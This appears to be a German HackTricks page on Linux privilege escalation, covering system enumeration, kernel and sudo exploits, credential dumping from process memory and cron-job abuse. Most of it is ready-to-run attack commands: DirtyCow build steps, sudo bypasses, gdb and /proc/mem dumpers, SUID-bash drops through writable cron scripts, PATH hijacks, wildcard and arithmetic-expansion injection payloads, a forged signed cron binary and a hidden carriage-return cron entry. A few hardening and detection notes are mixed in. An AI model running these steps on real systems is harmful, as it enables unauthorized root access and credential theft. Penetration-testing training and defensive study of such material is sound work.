# Linux Privilege Escalation

{{#include ../../../banners/hacktricks-training.md}}

## Systeminformationen

### Betriebssysteminformationen

Beginnen wir damit, Informationen über das ausgeführte Betriebssystem zu sammeln.
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Pfad

Wenn Sie **Schreibberechtigungen für einen beliebigen Ordner innerhalb der Variable `PATH`** haben, können Sie möglicherweise einige Bibliotheken oder Binaries kapern:
```bash
echo $PATH
```
### Umgebungsinformationen

Interessante Informationen, Passwörter oder API-Schlüssel in den Umgebungsvariablen?
```bash
(env || set) 2>/dev/null
```
### Kernel-Exploits

Überprüfe die Kernel-Version und ob es einen Exploit gibt, der zur Privilegieneskalation verwendet werden kann.
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Eine gute Liste verwundbarer Kernel und bereits **compiled exploits** findest du hier: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) sowie bei [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Weitere Websites, auf denen du **compiled exploits** finden kannst: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Um alle verwundbaren Kernel-Versionen von dieser Website zu extrahieren, kannst du Folgendes tun:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Tools, die bei der Suche nach Kernel-Exploits helfen können, sind:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (IM Opfer ausführen, prüft nur Exploits für Kernel 2.x)

**Suche immer nach der Kernel-Version in Google**, möglicherweise ist deine Kernel-Version in einem Kernel-Exploit angegeben. Dann kannst du sicher sein, dass dieser Exploit gültig ist.

Zusätzliche Kernel-Exploitation-Techniken:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Linux-Privilege Escalation - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo-Version

Basierend auf den verwundbaren sudo-Versionen, die hier erscheinen:
```bash
searchsploit sudo
```
Mit diesem grep kannst du prüfen, ob die sudo-Version verwundbar ist.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo-Versionen vor 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) ermöglichen es unprivilegierten lokalen Benutzern, ihre Privilegien auf root zu erweitern, indem sie die sudo-Option `--chroot` verwenden, wenn die Datei `/etc/nsswitch.conf` aus einem von Benutzern kontrollierten Verzeichnis verwendet wird.

Hier ist ein [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot), um diese [vulnerability](https://nvd.nist.gov/vuln/detail/CVE-2025-32463) auszunutzen. Stelle vor dem Ausführen des Exploits sicher, dass deine `sudo`-Version verwundbar ist und die `chroot`-Funktion unterstützt.

Weitere Informationen findest du in der ursprünglichen [vulnerability advisory](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/).

### Sudo host-based rules bypass (CVE-2025-32462)

Sudo vor 1.9.17p1 (gemeldeter betroffener Bereich: **1.8.8–1.9.17**) kann hostbasierte sudoers-Regeln anhand des **vom Benutzer angegebenen Hostnamens** aus `sudo -h <host>` statt anhand des **tatsächlichen Hostnamens** auswerten. Wenn sudoers auf einem anderen Host umfassendere Privilegien gewährt, kannst du diesen Host lokal **spoofen**.

Anforderungen:
- Verwundbare sudo-Version
- Host-spezifische sudoers-Regeln (der Host ist weder der aktuelle Hostname noch `ALL`)

Beispiel für ein sudoers-Muster:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Ausnutzung durch Spoofing des erlaubten Hosts:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Wenn die Auflösung des gefälschten Namens blockiert, füge ihn zu `/etc/hosts` hinzu oder verwende einen Hostnamen, der bereits in Logs/Konfigurationen erscheint, um DNS-Abfragen zu vermeiden.

#### sudo < v1.8.28

Von @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg-Signaturüberprüfung fehlgeschlagen

Siehe die **smasher2 box of HTB** als **Beispiel** dafür, wie diese Schwachstelle ausgenutzt werden könnte
```bash
dmesg 2>/dev/null | grep "signature"
```
### Weitere Systemenumeration
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Mögliche Schutzmaßnahmen auflisten

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Container Breakout

Wenn du dich innerhalb eines Containers befindest, beginne mit dem folgenden Abschnitt zur Container-Sicherheit und wechsle anschließend zu den spezifischen Abuse-Seiten der jeweiligen Runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Laufwerke

Prüfe, **was wo und warum eingehängt und ausgehängt ist**. Falls etwas ausgehängt ist, könntest du versuchen, es einzuhängen und auf private Informationen zu prüfen
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Nützliche Software

Nützliche Binärdateien auflisten
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Überprüfe außerdem, ob **irgendein Compiler installiert ist**. Das ist nützlich, wenn du einen Kernel-Exploit verwenden musst, da empfohlen wird, ihn auf der Maschine zu kompilieren, auf der du ihn verwenden wirst (oder auf einer ähnlichen Maschine).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Installierte verwundbare Software

Überprüfe die **Version der installierten Pakete und Dienste**. Möglicherweise ist beispielsweise eine alte Nagios-Version vorhanden, die zur Eskalation von Privilegien ausgenutzt werden könnte…\
Es wird empfohlen, die Version der verdächtigeren installierten Software manuell zu überprüfen.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Wenn du SSH-Zugriff auf die Maschine hast, kannst du auch **openVAS** verwenden, um nach veralteter und verwundbarer Software zu suchen, die auf der Maschine installiert ist.

> [!NOTE] > _Beachte, dass diese Befehle sehr viele Informationen anzeigen, von denen der Großteil nutzlos sein wird. Daher wird empfohlen, Anwendungen wie OpenVAS oder ähnliche zu verwenden, die überprüfen, ob eine installierte Softwareversion gegenüber bekannten Exploits verwundbar ist._

## Prozesse

Sieh dir an, **welche Prozesse** ausgeführt werden, und überprüfe, ob ein Prozess **mehr Rechte als vorgesehen** besitzt (wird beispielsweise Tomcat von root ausgeführt?).
```bash
ps aux
ps -ef
top -n 1
```
Prüfe immer, ob mögliche [**electron/cef/chromium-Debugger**](../../software-information/electron-cef-chromium-debugger-abuse.md) ausgeführt werden; du könntest sie zur Rechteausweitung missbrauchen. **Linpeas** erkennt diese, indem es den Parameter `--inspect` innerhalb der Befehlszeile des Prozesses prüft.\
Prüfe außerdem **deine Berechtigungen für die Binärdateien der Prozesse**; möglicherweise kannst du die Binärdatei eines anderen Benutzers überschreiben.

### Übergeordnete und untergeordnete Prozessketten zwischen Benutzern

Ein untergeordneter Prozess, der unter einem **anderen Benutzer** als sein übergeordneter Prozess ausgeführt wird, ist nicht automatisch bösartig, stellt aber ein nützliches **Triage-Signal** dar. Einige Übergänge sind erwartbar (`root` startet einen Service-Benutzer, Anmelde-Manager erstellen Sitzungsprozesse), doch ungewöhnliche Ketten können Wrapper, Debug-Hilfsprogramme, Persistenz oder schwache Vertrauensgrenzen zur Laufzeit offenlegen.

Schnellüberprüfung:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Wenn du eine überraschende Kette findest, untersuche die Befehlszeile des übergeordneten Prozesses und alle Dateien, die sein Verhalten beeinflussen (`config`, `EnvironmentFile`, Hilfsskripte, Arbeitsverzeichnis, schreibbare Argumente). Bei mehreren realen privesc-Pfaden war nicht das Kind selbst schreibbar, sondern die vom **übergeordneten Prozess kontrollierte config** oder die Hilfskette.

### Gelöschte Executables und gelöschte geöffnete Dateien

Laufzeitartefakte sind oft auch **nach dem Löschen** noch zugänglich. Dies ist sowohl für privilege escalation als auch für die Wiederherstellung von Beweisen aus einem Prozess nützlich, der bereits vertrauliche Dateien geöffnet hat.

Prüfe auf gelöschte Executables:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Wenn `/proc/<PID>/exe` auf `(deleted)` verweist, führt der Prozess weiterhin das alte Binary-Image aus dem Speicher aus. Das ist ein starkes Signal für weitere Untersuchungen, da:

- die entfernte ausführbare Datei interessante Strings oder Zugangsdaten enthalten kann
- der laufende Prozess möglicherweise weiterhin nützliche File Descriptors offenlegt
- ein gelöschtes privilegiertes Binary auf kürzlich erfolgte Manipulationen oder einen versuchten Cleanup hindeuten kann

Global nach gelöschten offenen Dateien suchen:
```bash
lsof +L1
```
Wenn du einen interessanten Deskriptor findest, ermittle ihn direkt:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Dies ist besonders wertvoll, wenn ein Prozess noch ein gelöschtes Secret, Script, einen Datenbankexport oder eine Flag-Datei geöffnet hat.

### Prozessüberwachung

Du kannst Tools wie [**pspy**](https://github.com/DominicBreuker/pspy) verwenden, um Prozesse zu überwachen. Dies kann sehr nützlich sein, um anfällige Prozesse zu identifizieren, die regelmäßig ausgeführt werden oder sobald bestimmte Voraussetzungen erfüllt sind.

### Prozessspeicher

Einige Dienste eines Servers speichern **Zugangsdaten im Klartext im Speicher**.\
Normalerweise benötigst du **Root-Rechte**, um den Speicher von Prozessen zu lesen, die anderen Benutzern gehören. Daher ist dies in der Regel nützlicher, wenn du bereits Root bist und weitere Zugangsdaten entdecken möchtest.\
Denke jedoch daran, dass du **als normaler Benutzer den Speicher der Prozesse lesen kannst, die dir gehören**.

> [!WARNING]
> Beachte, dass die meisten Systeme heutzutage **ptrace standardmäßig nicht erlauben**. Das bedeutet, dass du keine Dumps anderer Prozesse erstellen kannst, die deinem unprivilegierten Benutzer gehören.
>
> Die Datei _**/proc/sys/kernel/yama/ptrace_scope**_ steuert die Zugänglichkeit von ptrace:
>
> - **kernel.yama.ptrace_scope = 0**: Alle Prozesse können debuggt werden, solange sie dieselbe UID haben. Dies entspricht der klassischen Funktionsweise von ptracing.
> - **kernel.yama.ptrace_scope = 1**: Nur ein Elternprozess kann debuggt werden.
> - **kernel.yama.ptrace_scope = 2**: Nur ein Admin kann ptrace verwenden, da dafür die CAP_SYS_PTRACE-Fähigkeit erforderlich ist.
> - **kernel.yama.ptrace_scope = 3**: Keine Prozesse dürfen mit ptrace überwacht werden. Sobald dieser Wert gesetzt wurde, ist ein Neustart erforderlich, um ptracing wieder zu aktivieren.

#### GDB

Wenn du beispielsweise Zugriff auf den Speicher eines FTP-Dienstes hast, könntest du den Heap auslesen und darin nach Zugangsdaten suchen.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB-Skript
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Für eine bestimmte Prozess-ID zeigt **maps, wie der Speicher innerhalb des virtuellen Adressraums dieses Prozesses** abgebildet ist; außerdem werden die **Berechtigungen jeder abgebildeten Region** angezeigt. Die Pseudo-Datei **mem stellt den Speicher des Prozesses selbst bereit**. Aus der Datei **maps** wissen wir, welche **Speicherbereiche lesbar** sind und an welchen Offsets sie beginnen. Mit diesen Informationen springen wir in der Datei **mem** zu den entsprechenden Positionen und schreiben alle lesbaren Bereiche in eine Datei.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` ermöglicht den Zugriff auf den **physischen** Speicher des Systems, nicht auf den virtuellen Speicher. Auf den virtuellen Adressraum des Kernels kann über /dev/kmem zugegriffen werden.\
Typischerweise ist `/dev/mem` nur für **root** und die Gruppe **kmem** lesbar.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump für Linux

ProcDump ist eine Linux-Neuauflage des klassischen ProcDump-Tools aus der Sysinternals-Suite für Windows. Du erhältst es unter [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux).
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Tools

Um den Speicher eines Prozesses zu dumpen, kannst du Folgendes verwenden:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Du kannst die root-Anforderungen manuell entfernen und den Prozess dumpen, der dir gehört
- Script A.5 aus [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (root ist erforderlich)

### Credentials aus dem Process Memory

#### Manuelles Beispiel

Wenn du feststellst, dass der Authenticator-Prozess ausgeführt wird:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Du kannst den Prozess dumpen (siehe vorherige Abschnitte, um verschiedene Möglichkeiten zum Dumpen des Speichers eines Prozesses zu finden) und im Speicher nach Zugangsdaten suchen:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Das Tool [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) **stiehlt Klartext-Zugangsdaten aus dem Speicher** und aus einigen **bekannten Dateien**. Für eine ordnungsgemäße Funktion sind Root-Rechte erforderlich.

| Funktion                                           | Prozessname         |
| -------------------------------------------------- | -------------------- |
| GDM-Passwort (Kali Desktop, Debian Desktop)        | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop)  | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                            | lightdm              |
| VSFTPd (aktive FTP-Verbindungen)                   | vsftpd               |
| Apache2 (aktive HTTP-Basic-Auth-Sitzungen)         | apache2              |
| OpenSSH (aktive SSH-Sitzungen – Sudo-Nutzung)      | sshd:                |

#### Such-Regexes/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Geplante/Cron-Jobs

### Crontab UI (alseambusher), als root ausgeführt – webbasierte Scheduler-privesc

Wenn ein Web-„Crontab UI“-Panel (alseambusher/crontab-ui) als root läuft und nur an die Loopback-Schnittstelle gebunden ist, kannst du es trotzdem über SSH-Local-Port-Forwarding erreichen und einen privilegierten Job zur Rechteausweitung erstellen.

Typische Kette
- Einen nur an Loopback gebundenen Port (z. B. 127.0.0.1:8000) und den Basic-Auth-Realm über `ss -ntlp` / `curl -v localhost:8000` ermitteln
- Zugangsdaten in betrieblichen Artefakten finden:
- Backups/Skripte mit `zip -P <password>`
- systemd-Unit, die `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."` offenlegt
- Tunnel erstellen und anmelden:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Einen Job mit hohen Privilegien erstellen und sofort ausführen (legt eine SUID-Shell ab):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Verwende es:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Crontab UI nicht als root ausführen; mit einem dedizierten Benutzer und minimalen Berechtigungen einschränken
- An localhost binden und den Zugriff zusätzlich über Firewall/VPN einschränken; Passwörter nicht wiederverwenden
- Secrets nicht in Unit-Dateien einbetten; Secret Stores oder eine nur für root lesbare EnvironmentFile verwenden
- Audit/Logging für die Ausführung von On-Demand-Jobs aktivieren



Prüfe, ob ein geplanter Job verwundbar ist. Vielleicht kannst du ausnutzen, dass ein Skript von root ausgeführt wird (Wildcard vuln? Dateien ändern, die root verwendet? Symlinks verwenden? Bestimmte Dateien in dem von root verwendeten Verzeichnis erstellen?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Wenn `run-parts` verwendet wird, prüfen Sie, welche Namen tatsächlich ausgeführt werden:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Dies vermeidet False Positives. Ein beschreibbares periodisches Verzeichnis ist nur dann nützlich, wenn der Dateiname deiner Payload den lokalen `run-parts`-Regeln entspricht.

### Cron-Pfad

Zum Beispiel findest du in _/etc/crontab_ den PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Beachte, dass der Benutzer "user" Schreibrechte für /home/user besitzt_)

Wenn der Root-Benutzer innerhalb dieser Crontab versucht, einen Befehl oder ein Script auszuführen, ohne den Pfad festzulegen. Zum Beispiel: _\* \* \* \* root overwrite.sh_\
Dann kannst du eine Root-Shell erhalten, indem du Folgendes verwendest:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron mit einem Script mit einem Wildcard (Wildcard Injection)

Wenn ein von root ausgeführtes Script ein „**\***“ innerhalb eines Befehls enthält, könntest du dies ausnutzen, um unerwartete Dinge (wie privesc) zu bewirken. Beispiel:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Wenn dem Wildcard ein Pfad wie** _**/some/path/\***_ **vorangestellt ist, ist es nicht verwundbar (auch** _**./\***_ **ist es nicht).**

Lies die folgende Seite für weitere Tricks zur Ausnutzung von Wildcards:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Injektion durch Bash-Arithmetic-Expansion in Cron-Log-Parsern

Bash führt vor der arithmetischen Auswertung in ((...)), $((...)) und let Parameter-Expansion und Command-Substitution aus. Wenn ein Cronjob/Parser mit Root-Rechten nicht vertrauenswürdige Log-Felder liest und sie in einen arithmetischen Kontext übergibt, kann ein Angreifer eine Command-Substitution $(...) einschleusen, die mit Root-Rechten ausgeführt wird, sobald der Cronjob läuft.

- Warum es funktioniert: In Bash erfolgen Expansions in dieser Reihenfolge: Parameter-/Variablen-Expansion, Command-Substitution, Arithmetic-Expansion, anschließend Word-Splitting und Pathname-Expansion. Ein Wert wie `$(/bin/bash -c 'id > /tmp/pwn')0` wird daher zuerst substituiert (wodurch der Befehl ausgeführt wird), anschließend wird die verbleibende numerische `0` für die Arithmetik verwendet, sodass das Script ohne Fehler fortgesetzt wird.

- Typisches verwundbares Muster:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Ausnutzung: Bringe vom Angreifer kontrollierten Text in das geparste Log, sodass das numerisch aussehende Feld eine Command-Substitution enthält und mit einer Ziffer endet. Stelle sicher, dass dein Befehl nichts auf stdout ausgibt (oder leite die Ausgabe um), damit die Arithmetik gültig bleibt.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Überschreiben von Cron-Scripts und Symlink

Wenn du **ein von Root ausgeführtes Cron-Script ändern kannst**, kannst du sehr einfach eine Shell erhalten:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Wenn das von root ausgeführte Script ein **Verzeichnis verwendet, auf das du vollständigen Zugriff hast**, könnte es möglicherweise hilfreich sein, diesen Ordner zu löschen und **einen symbolischen Link auf einen anderen Ordner zu erstellen**, der ein von dir kontrolliertes Script enthält.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Symlink-Validierung und sicherere Dateiverarbeitung

Bei der Überprüfung privilegierter Scripts/Binaries, die Dateien anhand eines Pfads lesen oder schreiben, sollte geprüft werden, wie Links behandelt werden:

- `stat()` folgt einem Symlink und gibt Metadaten des Ziels zurück.
- `lstat()` gibt Metadaten des Links selbst zurück.
- `readlink -f` und `namei -l` helfen dabei, das endgültige Ziel aufzulösen und die Berechtigungen jeder Pfadkomponente anzuzeigen.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Für Defender/Entwickler umfassen sicherere Muster gegen Symlink-Tricks:

- `O_EXCL` mit `O_CREAT`: schlägt fehl, wenn der Pfad bereits existiert (blockiert vom Angreifer vorab erstellte Links/Dateien).
- `openat()`: arbeitet relativ zu einem vertrauenswürdigen Verzeichnis-File-Descriptor.
- `mkstemp()`: erstellt temporäre Dateien atomar mit sicheren Berechtigungen.

### Benutzerdefinierte signierte Cron-Binaries mit beschreibbaren Payloads
Blue Teams "signieren" manchmal Cron-gesteuerte Binaries, indem sie einen benutzerdefinierten ELF-Abschnitt ausgeben und vor deren Ausführung als root nach einem Hersteller-String suchen. Wenn dieses Binary gruppenbeschreibbar ist (z. B. `/opt/AV/periodic-checks/monitor`, im Besitz von `root:devs 770`) und du das Signiermaterial leaken kannst, kannst du den Abschnitt fälschen und den Cron-Task übernehmen:

1. Verwende `pspy`, um den Verifizierungsablauf aufzuzeichnen. In Era führte root `objcopy --dump-section .text_sig=text_sig_section.bin monitor` aus, gefolgt von `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, und führte anschließend die Datei aus.
2. Erstelle das erwartete Zertifikat mit dem geleakten Schlüssel/der geleakten Konfiguration (aus `signing.zip`) neu:
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Erstelle einen bösartigen Ersatz (z. B. lege eine SUID-bash ab oder füge deinen SSH-Key hinzu) und bette das Zertifikat in `.text_sig` ein, damit `grep` erfolgreich ist:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Überschreibe das geplante Binary und bewahre dabei die Execute-Bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Warte auf den nächsten Cron-Lauf. Sobald die naive Signaturprüfung erfolgreich ist, wird deine Payload als root ausgeführt.

### Häufige Cron-Jobs

Du kannst die Prozesse überwachen, um nach Prozessen zu suchen, die jede 1, 2 oder 5 Minuten ausgeführt werden. Vielleicht kannst du das ausnutzen und deine Privilegien eskalieren.

Um beispielsweise **während 1 Minute alle 0,1 s zu überwachen**, nach **am seltensten ausgeführten Commands zu sortieren** und die am häufigsten ausgeführten Commands zu löschen, kannst du Folgendes verwenden:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Du kannst auch** [**pspy**](https://github.com/DominicBreuker/pspy/releases) **verwenden** (dies überwacht und listet jeden gestarteten Prozess auf).

### Root-Backups, die vom Angreifer gesetzte Mode-Bits bewahren (pg_basebackup)

Wenn ein Root-eigenes Cron-Job `pg_basebackup` (oder eine rekursive Kopie) auf ein Datenbankverzeichnis anwendet, in das du schreiben kannst, kannst du eine **SUID/SGID-Binary** platzieren, die mit denselben Mode-Bits als **root:root** in die Backup-Ausgabe rekopiert wird.

Typischer Ablauf zur Entdeckung (als Benutzer mit niedrigen DB-Rechten):
- Verwende `pspy`, um einen Root-Cron-Job zu entdecken, der beispielsweise jede Minute `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` aufruft.
- Bestätige, dass der Quell-Cluster (z. B. `/var/lib/postgresql/14/main`) für dich beschreibbar ist und das Ziel (`/opt/backups/current`) nach Ausführung des Jobs Root gehört.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Dies funktioniert, weil `pg_basebackup` die Dateimodus-Bits beim Kopieren des Clusters beibehält; wenn es von root ausgeführt wird, übernehmen die Zieldateien **root-Eigentümerschaft + vom Angreifer gewählte SUID/SGID**. Jede ähnliche privilegierte Backup-/Kopierroutine, die Berechtigungen beibehält und in einen ausführbaren Speicherort schreibt, ist verwundbar.

### Unsichtbare Cronjobs

Es ist möglich, einen Cronjob zu erstellen, indem **nach einem Kommentar ein Wagenrücklauf eingefügt wird** (ohne Newline-Zeichen); der Cronjob funktioniert trotzdem. Beispiel (beachte das Wagenrücklaufzeichen):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Um diese Art von Stealth-Eintrag zu erkennen, überprüfe Cron-Dateien mit Tools, die Steuerzeichen sichtbar machen:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Dienste

### Beschreibbare _.service_-Dateien

